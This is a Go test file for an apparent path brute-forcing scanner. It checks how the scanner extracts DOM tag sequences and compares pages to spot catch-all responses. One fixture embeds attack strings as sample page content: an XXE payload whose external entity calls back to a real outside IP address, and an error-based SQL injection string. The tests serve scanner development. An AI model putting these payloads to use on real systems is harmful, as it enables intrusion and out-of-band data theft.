package pathbrute

import (
	"strings"
	"testing"
)

func TestDomStructure(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple tags with text",
			input:    `<h1>Readme</h1><ul><li>payload1</li><li>payload2</li></ul>`,
			expected: "h1 /h1 ul li /li li /li /ul",
		},
		{
			name:     "attributes stripped",
			input:    `<div class="test" id="main">content</div>`,
			expected: "div /div",
		},
		{
			name:     "form with attributes",
			input:    `<form method="post" href="."><textarea name="text"></textarea><input type="submit" value="store"></form>`,
			expected: "form textarea /textarea input /form",
		},
		{
			name:     "empty input",
			input:    ``,
			expected: "",
		},
		{
			name:     "tags only no text",
			input:    `<br><hr>`,
			expected: "br hr",
		},
		{
			name:     "text before first tag stripped",
			input:    `plain text<div>inside</div>`,
			expected: "div /div",
		},
		{
			name:     "nested tags with mixed content",
			input:    `<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>`,
			expected: "html head title /title /head body h1 /h1 p /p /body /html",
		},
		{
			name:     "PI and DOCTYPE stripped",
			input:    `<?xml version="1.0"?><!DOCTYPE html><html><body>text</body></html>`,
			expected: "html body /body /html",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := domStructure(tt.input)
			if result != tt.expected {
				t.Errorf("domStructure() = %q, want %q", result, tt.expected)
			}
		})
	}
}

func TestDomStructure_CatchAllDetection(t *testing.T) {
	// Simulate the real-world scenario: verifyWithRandomSuffix sends two requests
	// almost simultaneously to the same server. Both /env and /env_RANDOM return
	// the EXACT same page at that moment (same dynamic content).

	samePage := `<html>
<head>
</head>

<h1>Readme</h1>
<a href="?source"><h2>Check Code</h2></a>
<ul>
    <li></li>
    <li><?xml+version="1.0"?><!DOCTYPE+ANY+[<!ENTITY+content+SYSTEM+"http://165.154.202.205:8787/i/82e6f0/qk90/rzz9/">]><a>&content;</a></li>
    <li></li>
    <li>'and/**/extractvalue(1,concat(char(126),substr(md5(5535585208),1,20)))and'"</li>
</ul>

<form method="post" href=".">
    <textarea name="text"></textarea>
    <input type="submit" value="store">
</form>`

	// In the real scenario, both /env and /env_RANDOM return the same page
	structEnv := domStructure(samePage)
	structRandom := domStructure(samePage)

	bodySim := bodySimilarity(samePage, samePage)
	structSim := bodySimilarity(structEnv, structRandom)

	t.Logf("Same page: bodySim=%.3f, structSim=%.3f", bodySim, structSim)
	t.Logf("DOM structure: %s", structEnv)

	// Same page must be detected as catch-all
	if bodySim <= 0.8 && structSim <= 0.9 {
		t.Errorf("Same page should be detected as catch-all: bodySim=%.3f, structSim=%.3f", bodySim, structSim)
	}
}

func TestDomStructure_CatchAllWithDifferentDynamicContent(t *testing.T) {
	// Edge case: dynamic content differs between two requests (race condition).
	// Even with different payloads, the tag sequence should be largely similar.

	page1 := `<html><head></head><body><h1>Readme</h1><ul><li>text1</li><li>text2</li></ul><form method="post"><textarea name="text"></textarea><input type="submit"></form></body></html>`
	page2 := `<html><head></head><body><h1>Readme</h1><ul><li>text3</li><li>text4</li></ul><form method="post"><textarea name="text"></textarea><input type="submit"></form></body></html>`

	struct1 := domStructure(page1)
	struct2 := domStructure(page2)

	t.Logf("Page1 structure: %s", struct1)
	t.Logf("Page2 structure: %s", struct2)

	// Same static structure → identical tag sequence
	if struct1 != struct2 {
		t.Errorf("Pages with same structure but different text should have identical tag sequences")
	}
}

func TestDomStructure_RealEndpointVsCatchAll(t *testing.T) {
	// Real /env endpoint (Spring Boot Actuator) - returns JSON
	realEnvPage := `{"propertySources":[{"name":"servletConfigInitParams"},{"name":"systemProperties","property":{"java.runtime.name":"OpenJDK Runtime"}}],"activeProfiles":["production"]}`

	// Random path on same server - returns 404 or generic page
	randomPage := `<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>`

	structReal := domStructure(realEnvPage)
	structRandom := domStructure(randomPage)
	structSim := bodySimilarity(structReal, structRandom)
	bodySim := bodySimilarity(realEnvPage, randomPage)

	t.Logf("Real endpoint vs random: bodySim=%.3f, structSim=%.3f", bodySim, structSim)
	t.Logf("Real endpoint structure: %s", structReal)
	t.Logf("Random page structure: %s", structRandom)

	// A real endpoint should NOT be flagged as catch-all
	if bodySim > 0.8 || structSim > 0.9 {
		t.Errorf("Real endpoint should not be flagged as catch-all: bodySim=%.3f, structSim=%.3f", bodySim, structSim)
	}
}

func TestBodySimilarity(t *testing.T) {
	tests := []struct {
		name     string
		a, b     string
		min, max float64
	}{
		{"identical", "hello", "hello", 0.99, 1.01},
		{"empty both", "", "", 0.99, 1.01},
		{"one empty", "hello", "", 0.0, 0.01},
		{"very different", "aaaa", "bbbb", 0.0, 0.6},
		{"same structure different text", "<h1>A</h1><p>B</p>", "<h1>C</h1><p>D</p>", 0.3, 1.01},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sim := bodySimilarity(tt.a, tt.b)
			if sim < tt.min || sim > tt.max {
				t.Errorf("bodySimilarity(%q, %q) = %.3f, want [%.3f, %.3f]", tt.a, tt.b, sim, tt.min, tt.max)
			}
		})
	}
}

func TestIsAlphaNum(t *testing.T) {
	tests := []struct {
		c        byte
		expected bool
	}{
		{'a', true}, {'Z', true}, {'0', true}, {'9', true},
		{'-', false}, {' ', false}, {'_', false}, {'.', false},
	}

	for _, tt := range tests {
		if got := isAlphaNum(tt.c); got != tt.expected {
			t.Errorf("isAlphaNum(%q) = %v, want %v", tt.c, got, tt.expected)
		}
	}
}

func TestVerifyWithRandomSuffix_Integration(t *testing.T) {
	// Test the domStructure + bodySimilarity combination for catch-all detection.
	// This simulates what verifyWithRandomSuffix does: compare the original
	// response with the verification response.

	// Case 1: Same catch-all page (e.g. /env and /env_RANDOM both return "Readme")
	input1 := `<html><head></head><body><h1>Readme</h1><ul><li>XXE_PAYLOAD</li><li>SQLI_PAYLOAD</li></ul><form method="post"><textarea name="text"></textarea><input type="submit"></form></body></html>`
	input2 := `<html><head></head><body><h1>Readme</h1><ul><li>DIFFERENT_PAYLOAD</li><li>ANOTHER_PAYLOAD</li></ul><form method="post"><textarea name="text"></textarea><input type="submit"></form></body></html>`

	struct1 := domStructure(input1)
	struct2 := domStructure(input2)

	// With tag-name-sequence approach, both should have identical structure
	if struct1 != struct2 {
		t.Errorf("Catch-all pages should have identical tag sequences:\n  struct1: %s\n  struct2: %s", struct1, struct2)
	}

	bodySim := bodySimilarity(input1, input2)
	structSim := bodySimilarity(struct1, struct2)

	t.Logf("Catch-all pages: bodySim=%.3f, structSim=%.3f", bodySim, structSim)

	// Tag sequence identity → structSim = 1.0 → catch-all detected
	if structSim <= 0.9 {
		t.Errorf("Identical tag sequences should have structSim > 0.9, got %.3f", structSim)
	}
}

func TestDomStructure_SelfClosingTags(t *testing.T) {
	input := `<br/><img src="test.png"/><input type="text"/>`

	result := domStructure(input)
	// Tag names should be extracted (without attributes)
	if !strings.Contains(result, "br") {
		t.Errorf("domStructure should extract br tag, got: %s", result)
	}
	if !strings.Contains(result, "img") {
		t.Errorf("domStructure should extract img tag, got: %s", result)
	}
	if !strings.Contains(result, "input") {
		t.Errorf("domStructure should extract input tag, got: %s", result)
	}
}
